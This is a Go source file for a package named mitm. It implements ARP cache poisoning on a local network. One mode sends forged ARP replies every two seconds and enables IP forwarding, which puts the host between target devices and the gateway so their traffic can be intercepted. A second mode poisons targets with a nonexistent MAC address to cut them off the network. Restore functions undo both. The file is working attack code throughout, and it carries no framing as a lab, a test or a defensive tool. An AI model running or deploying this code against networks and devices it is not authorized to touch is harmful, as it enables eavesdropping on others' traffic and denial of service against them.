package mitm

import (
	"log"
	"net"
	"net/netip"
	"os"
	"sync"
	"sync/atomic"
	"time"

	"github.com/mdlayher/arp"
)

// deadMAC is a locally-administered unicast MAC that does not exist on any real device.
// Poisoning a device with this MAC as its gateway cuts it off from the network.
var deadMAC, _ = net.ParseMAC("02:00:00:00:00:01")

type MITM struct {
	iface  *net.Interface
	gwIP   net.IP
	ourMAC net.HardwareAddr

	gwMACMu sync.RWMutex
	gwMAC   net.HardwareAddr

	mu        sync.Mutex
	targets   map[string]net.HardwareAddr
	blocked   map[string]net.HardwareAddr // ip → real mac
	blockRun  int                         // protected by mu
	blockStop chan struct{}                // protected by mu

	active int32
	stop   chan struct{}
}

func New(iface *net.Interface, gwIP net.IP) *MITM {
	return &MITM{
		iface:   iface,
		gwIP:    gwIP,
		ourMAC:  iface.HardwareAddr,
		targets: make(map[string]net.HardwareAddr),
		blocked: make(map[string]net.HardwareAddr),
	}
}

func (m *MITM) MITMActive() bool { return atomic.LoadInt32(&m.active) == 1 }

func (m *MITM) getGWMAC() net.HardwareAddr {
	m.gwMACMu.RLock()
	defer m.gwMACMu.RUnlock()
	return m.gwMAC
}

func (m *MITM) setGWMAC(mac net.HardwareAddr) {
	m.gwMACMu.Lock()
	m.gwMAC = mac
	m.gwMACMu.Unlock()
}

func (m *MITM) AddTarget(ip string, mac net.HardwareAddr) {
	m.mu.Lock()
	m.targets[ip] = mac
	m.mu.Unlock()
}

// BlockDevice cuts the device off the network via ARP poison with a dead MAC.
// Works independently from MITM — starts its own poison loop if needed.
func (m *MITM) BlockDevice(ip string, mac net.HardwareAddr) {
	m.mu.Lock()
	m.blocked[ip] = mac
	shouldStart := m.blockRun == 0
	if shouldStart {
		m.blockRun = 1
		m.blockStop = make(chan struct{})
	}
	stopCh := m.blockStop
	m.mu.Unlock()
	if shouldStart {
		go m.blockLoop(stopCh)
	}
}

func (m *MITM) UnblockDevice(ip string) {
	m.mu.Lock()
	mac := m.blocked[ip]
	delete(m.blocked, ip)
	var stopCh chan struct{}
	if len(m.blocked) == 0 && m.blockRun == 1 {
		m.blockRun = 0
		stopCh = m.blockStop
	}
	m.mu.Unlock()
	if mac != nil {
		m.restoreOne(ip, mac)
	}
	if stopCh != nil {
		close(stopCh)
	}
}

func (m *MITM) IsBlocked(ip string) bool {
	m.mu.Lock()
	_, ok := m.blocked[ip]
	m.mu.Unlock()
	return ok
}

func (m *MITM) BlockedIPs() []string {
	m.mu.Lock()
	defer m.mu.Unlock()
	ips := make([]string, 0, len(m.blocked))
	for ip := range m.blocked {
		ips = append(ips, ip)
	}
	return ips
}

func (m *MITM) StartMITM() error {
	if atomic.SwapInt32(&m.active, 1) == 1 {
		return nil
	}
	if mac, _ := m.resolveMAC(m.gwIP); mac != nil {
		m.setGWMAC(mac)
	}
	log.Printf("MITM start: gw=%s gwMAC=%s targets=%d", m.gwIP, m.getGWMAC(), len(m.targets))
	enableIPForwarding()
	m.stop = make(chan struct{})
	go m.loop()
	return nil
}

func (m *MITM) StopMITM() {
	if atomic.SwapInt32(&m.active, 0) == 0 {
		return
	}
	close(m.stop)
	m.restore()
	disableIPForwarding()
}

func (m *MITM) loop() {
	tick := time.NewTicker(2 * time.Second)
	defer tick.Stop()
	m.poison()
	for {
		select {
		case <-m.stop:
			return
		case <-tick.C:
			m.poison()
		}
	}
}

func (m *MITM) blockLoop(stopCh chan struct{}) {
	if m.getGWMAC() == nil {
		if mac, _ := m.resolveMAC(m.gwIP); mac != nil {
			m.setGWMAC(mac)
		}
	}
	tick := time.NewTicker(2 * time.Second)
	defer tick.Stop()
	m.poisonBlocked()
	for {
		select {
		case <-stopCh:
			return
		case <-tick.C:
			m.poisonBlocked()
		}
	}
}

func (m *MITM) poison() {
	cl, err := arp.Dial(m.iface)
	if err != nil {
		return
	}
	defer cl.Close()
	cl.SetDeadline(time.Now().Add(1 * time.Second))

	m.mu.Lock()
	snap := make(map[string]net.HardwareAddr, len(m.targets))
	for k, v := range m.targets {
		snap[k] = v
	}
	m.mu.Unlock()

	gwAddr, _ := netip.AddrFromSlice(m.gwIP.To4())
	gwMAC := m.getGWMAC()

	for ipStr, tMAC := range snap {
		tIP := net.ParseIP(ipStr).To4()
		if tIP == nil {
			continue
		}
		tAddr, _ := netip.AddrFromSlice(tIP)
		if p, err := arp.NewPacket(arp.OperationReply, m.ourMAC, gwAddr, tMAC, tAddr); err == nil {
			cl.WriteTo(p, tMAC)
		}
		if gwMAC != nil {
			if p, err := arp.NewPacket(arp.OperationReply, m.ourMAC, tAddr, gwMAC, gwAddr); err == nil {
				cl.WriteTo(p, gwMAC)
			}
		}
	}
}

func (m *MITM) poisonBlocked() {
	cl, err := arp.Dial(m.iface)
	if err != nil {
		return
	}
	defer cl.Close()
	cl.SetDeadline(time.Now().Add(1 * time.Second))

	gwAddr, _ := netip.AddrFromSlice(m.gwIP.To4())
	gwMAC := m.getGWMAC()

	m.mu.Lock()
	snap := make(map[string]net.HardwareAddr, len(m.blocked))
	for k, v := range m.blocked {
		snap[k] = v
	}
	m.mu.Unlock()

	for ipStr, tMAC := range snap {
		tIP := net.ParseIP(ipStr).To4()
		if tIP == nil {
			continue
		}
		tAddr, _ := netip.AddrFromSlice(tIP)
		if p, err := arp.NewPacket(arp.OperationReply, deadMAC, gwAddr, tMAC, tAddr); err == nil {
			cl.WriteTo(p, tMAC)
		}
		if gwMAC != nil {
			if p, err := arp.NewPacket(arp.OperationReply, deadMAC, tAddr, gwMAC, gwAddr); err == nil {
				cl.WriteTo(p, gwMAC)
			}
		}
	}
}

func (m *MITM) restore() {
	cl, err := arp.Dial(m.iface)
	if err != nil {
		return
	}
	defer cl.Close()
	cl.SetDeadline(time.Now().Add(2 * time.Second))

	m.mu.Lock()
	snap := make(map[string]net.HardwareAddr, len(m.targets))
	for k, v := range m.targets {
		snap[k] = v
	}
	m.mu.Unlock()

	gwAddr, _ := netip.AddrFromSlice(m.gwIP.To4())
	gwMAC := m.getGWMAC()
	for ipStr, tMAC := range snap {
		tIP := net.ParseIP(ipStr).To4()
		if tIP == nil {
			continue
		}
		tAddr, _ := netip.AddrFromSlice(tIP)
		if gwMAC != nil {
			if p, err := arp.NewPacket(arp.OperationReply, gwMAC, gwAddr, tMAC, tAddr); err == nil {
				cl.WriteTo(p, tMAC)
			}
			if p, err := arp.NewPacket(arp.OperationReply, tMAC, tAddr, gwMAC, gwAddr); err == nil {
				cl.WriteTo(p, gwMAC)
			}
		}
	}
	log.Println("MITM: ARP restored")
}

func (m *MITM) restoreOne(ipStr string, tMAC net.HardwareAddr) {
	if m.getGWMAC() == nil {
		if mac, _ := m.resolveMAC(m.gwIP); mac != nil {
			m.setGWMAC(mac)
		}
	}
	cl, err := arp.Dial(m.iface)
	if err != nil {
		return
	}
	defer cl.Close()
	cl.SetDeadline(time.Now().Add(1 * time.Second))

	tIP := net.ParseIP(ipStr).To4()
	if tIP == nil {
		return
	}
	tAddr, _ := netip.AddrFromSlice(tIP)
	gwAddr, _ := netip.AddrFromSlice(m.gwIP.To4())
	gwMAC := m.getGWMAC()
	if gwMAC != nil {
		if p, err := arp.NewPacket(arp.OperationReply, gwMAC, gwAddr, tMAC, tAddr); err == nil {
			cl.WriteTo(p, tMAC)
		}
		if p, err := arp.NewPacket(arp.OperationReply, tMAC, tAddr, gwMAC, gwAddr); err == nil {
			cl.WriteTo(p, gwMAC)
		}
	}
	log.Printf("Block: ARP restored for %s", ipStr)
}

func (m *MITM) resolveMAC(ip net.IP) (net.HardwareAddr, error) {
	cl, err := arp.Dial(m.iface)
	if err != nil {
		return nil, err
	}
	defer cl.Close()
	cl.SetDeadline(time.Now().Add(3 * time.Second))
	addr, _ := netip.AddrFromSlice(ip.To4())
	done := make(chan net.HardwareAddr, 1)
	go func() {
		for {
			pkt, _, err := cl.Read()
			if err != nil {
				return
			}
			if pkt.Operation == arp.OperationReply && pkt.SenderIP == addr {
				mac := make(net.HardwareAddr, len(pkt.SenderHardwareAddr))
				copy(mac, pkt.SenderHardwareAddr)
				done <- mac
				return
			}
		}
	}()
	cl.Request(addr)
	select {
	case mac := <-done:
		return mac, nil
	case <-time.After(3 * time.Second):
		return nil, nil
	}
}

func enableIPForwarding() {
	if err := os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("1\n"), 0644); err != nil {
		log.Printf("MITM: cannot enable IP forwarding: %v", err)
	}
}

func disableIPForwarding() {
	if err := os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("0\n"), 0644); err != nil {
		log.Printf("MITM: cannot disable IP forwarding: %v", err)
	}
}
